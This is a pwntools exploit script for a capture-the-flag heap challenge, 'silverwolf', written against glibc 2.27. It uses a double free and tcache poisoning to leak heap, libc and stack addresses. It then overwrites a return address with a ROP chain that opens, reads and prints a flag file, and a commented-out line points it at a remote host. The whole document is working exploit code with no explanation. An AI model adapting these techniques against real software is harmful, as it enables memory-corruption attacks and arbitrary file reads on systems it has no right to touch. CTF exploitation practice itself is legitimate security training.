from pwn import *
context.log_level="debug"
context.terminal=['tmux','sp','-h']

# p = process("./silverwolf",env={'LD_PRELOAD':'./libc-2.27.so'})
p = process("./silverwolf")
libc = ELF("./libc-2.27.so")
# p=remote('124.71.225.222',25304)
def add(a1,a2):
    p.sendafter('Your choice: ','1 ')
    p.sendafter('Index: ',str(a1)+' ')
    p.sendafter('Size: ',str(a2)+' ')

def edit(a1,a2):
    p.sendafter('Your choice: ','2 ')
    p.sendafter('Index: ',str(a1)+' ')
    p.sendlineafter('Content: ',a2)

def show(a1):
    p.sendafter('Your choice: ','3 ')
    p.sendafter('Index: ',str(a1)+' ')

def dele(a1):
    p.sendafter('Your choice: ','4 ')
    p.sendafter('Index: ',str(a1)+' ')

add(0,0x60)#0 0x60
dele(0)
edit(0,p64(0)*2)#double free
dele(0)
show(0)
p.recvuntil('Content: ')
#print(p.recv(6))
heapbase=u64(p.recv(6).ljust(8,'\x00'))-(0x555c75b72dd0-0x555c75b72000)
#heapbase=int(p.recv(14),16)
print(hex(heapbase))

# edit(0,p64(heapbase+0x10)+p64(0))
# add(0,0x60)
# add(0,0x60)
# edit(0,p64(0x0007050700000007))
# add(0,0x58)
# dele(0)
# edit(0,p64(0)*2)
# dele(0)

add(0,'1'*0x2000)
for _ in range(10):
    add(0,0x18)



for _ in range(8):
    dele(0)
    edit(0,p64(0)*2)
    print _



add(0,'1'*0x2000)
show(0)
main_arean_112 = u64(p.recvuntil("\x7f")[-6:].ljust(8,'\x00'))
log.info("main_arean_112:"+hex(main_arean_112))
libc_base = main_arean_112 - (0x7f2ebde02cb0-0x7f2ebda17000)
log.info("libc_base:"+hex(libc_base))
environ_addr = libc_base + libc.sym['environ']
log.info("environ_addr:"+hex(environ_addr))

edit(0,p64(environ_addr)*2)
add(0,0x18)
add(0,0x18)
show(0)
stack_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8,'\x00'))
log.info("stack_addr:"+hex(stack_addr))
edit_ret_addr = stack_addr - (0x7ffd7ec866b8-0x7ffd7ec86598)
log.info("edit_ret_addr:"+hex(edit_ret_addr))

open_addr=libc_base+0x13061D
read=libc_base+libc.sym['read']
puts=libc_base+libc.sym['puts']
write=libc_base+libc.sym['write']
pop_rdi_ret=libc_base+0x00000000000215bf#0x0000000000026b72
pop_rsi_ret=libc_base+0x0000000000023eea#0x0000000000027529
pop_rdx_r12_ret=libc_base+0x0000000000130544#0x000000000011c371
leave_ret = libc_base+0x0000000000054913#0x000000000005aa48
gadget=libc_base+0x157D8A#0x157BFA
log.info("gadget:"+hex(gadget))
add_rsp_0x18_ret=libc_base+0x000000000003794a
ret=libc_base+0x00000000000008aa#0x0000000000025679

add(0,0x78)
edit(0,"./flag")#0x000055b1257abe50-0x55b1257ab000
# add(0,0x78)#0x00005590a1d71170-0x5590a1d70000
# payload=p64(pop_rdi_ret)+p64(heapbase+(0x000055b1257abe50-0x55b1257ab000))  #"flag" in chunk0
# payload+=p64(pop_rsi_ret)+p64(0)
# payload+=p64(pop_rdx_r12_ret)+p64(0)*2
# payload+=p64(open_addr)

# payload+=p64(pop_rdi_ret)+p64(4)
# payload+=p64(pop_rsi_ret)
# payload+=p64(heapbase+0x9f0)#where flag 
# payload+=p64(pop_rdx_r12_ret)+p64(0x50)+p64(0)
# payload+=p64(read)

# payload+=p64(pop_rdi_ret)+p64(1)
# payload+=p64(pop_rsi_ret)
# payload+=p64(heapbase+0x9f0)#where flag 
# payload+=p64(write)
# edit(0,payload)

add(0,0x58)
dele(0)
edit(0,p64(edit_ret_addr))
add(0,0x58)
add(0,0x58)

pop_rax=libc_base+0x0000000000043ae8

payload=p64(pop_rdi_ret)+p64(0)
payload+=p64(pop_rsi_ret)
payload+=p64(edit_ret_addr+0x40)#where rip
payload+=p64(pop_rdx_r12_ret)+p64(0x500)+p64(0)
payload+=p64(read)
#gdb.attach(io,"b *0x7ffff77deae9")
raw_input()
edit(0,payload)

payload=p64(pop_rdi_ret)+p64(heapbase+(0x000055b1257abe50-0x55b1257ab000))  #"flag" in chunk0
payload+=p64(pop_rsi_ret)+p64(0)
payload+=p64(pop_rax)+p64(2)
payload+=p64(open_addr)

payload+=p64(pop_rdi_ret)+p64(3)
payload+=p64(pop_rsi_ret)
payload+=p64(heapbase+0x9f0)#where flag 
payload+=p64(pop_rdx_r12_ret)+p64(0x50)+p64(0)
payload+=p64(read)

payload+=p64(pop_rdi_ret)+p64(1)
payload+=p64(pop_rsi_ret)
payload+=p64(heapbase+0x9f0)#where flag 
payload+=p64(write)
p.send(payload)

p.interactive()